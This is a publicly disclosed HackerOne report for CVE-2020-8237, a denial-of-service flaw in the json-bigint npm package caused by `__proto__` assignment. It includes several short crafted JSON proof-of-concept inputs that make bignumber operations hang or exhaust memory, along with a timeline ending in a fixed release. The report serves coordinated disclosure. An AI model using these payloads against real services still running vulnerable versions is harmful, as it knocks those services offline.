---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2020-08-25
submitted: 2020-07-06T07:06:56.720Z
bounty_usd: null
votes: 1
cve: "CVE-2020-8237"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/916430"
title: "[json-bigint] DoS via `__proto__` assignment"
---
# [json-bigint] DoS via `__proto__` assignment

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-25

- Report: [https://hackerone.com/reports/916430](https://hackerone.com/reports/916430)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2020-8237
- Submitted: 2020-07-06T07:06:56.720Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a DoS in `json-bigint`.
It allows to cause denial of service using very limited input (~70 bytes).

# Module

**module name:** `json-bigint`
**version:**  0.3.1
**npm page:** `https://www.npmjs.com/package/json-bigint`

## Module Description

> JSON.parse/stringify with bigints support. Based on Douglas Crockford JSON.js package and bignumber.js library.

## Module Stats

2 301 424 weekly downloads

# Vulnerability

## Vulnerability Description

Json parsing library assigns to `__proto__`, which can be abused to confuse `bignumber.js` library, causing a DoS on various operations with the resulting number (stringification, arithmetic) via a very small input (70 bytes).

## Steps To Reproduce:

```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}'
const r = JSONbig.parse(json)
console.log(r.toString())
```

Note that the object parsed, but an attempt to convert it to a string (or to do any arithmetic operation on it) will hang.

Demo with arithmetic operation hanging:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"0":42,"length":2}}'
const r = JSONbig.parse(json)
r.dividedBy(42)
```

## Patch

Be careful when assigning to `__proto__` value.

## Supporting Material/References:

- [OPERATING SYSTEM VERSION]: `Linux xps 5.7.6-arch1-1 #1 SMP PREEMPT Thu, 25 Jun 2020 00:14:47 +0000 x86_64 GNU/Linux`
- [NODEJS VERSION]: 14.5.0

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

Denial of service via untrusted input.

## Timeline

- **Report Filed**
- **2020-07-08** @chalker: > I contacted the maintainer to let them know

Now "Y".

Could someone add https://github.com/sidorares to the conversation, please?
- **2020-07-08** @chalker: Even shorter version for arithmetic operations:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":[{}]}'
const r = JSONbig.parse(json)
r.dividedBy(42)
```
- **2020-07-08** @chalker: Another one, this is OOM:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"e":1e23}'
const r = JSONbig.parse(json)
r.minus(1)
```
- **External User Joined**
- **2020-07-14** @sidorares: published v1.0.0 release with a fix
- **2020-08-02** @bbe8482aecd24374d13c5de15a0a6: Thanks for the update and releasing a new version with a fix @sidorares.
@chalker can you confirm that this resolves the reported issue?
- **2020-08-24** @chalker: This issue looks fixed in the security sense.
I have some questions about the fix, but those are not related to security.
This report can be closed, sorry for the delayed recheck.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Changed Scope**
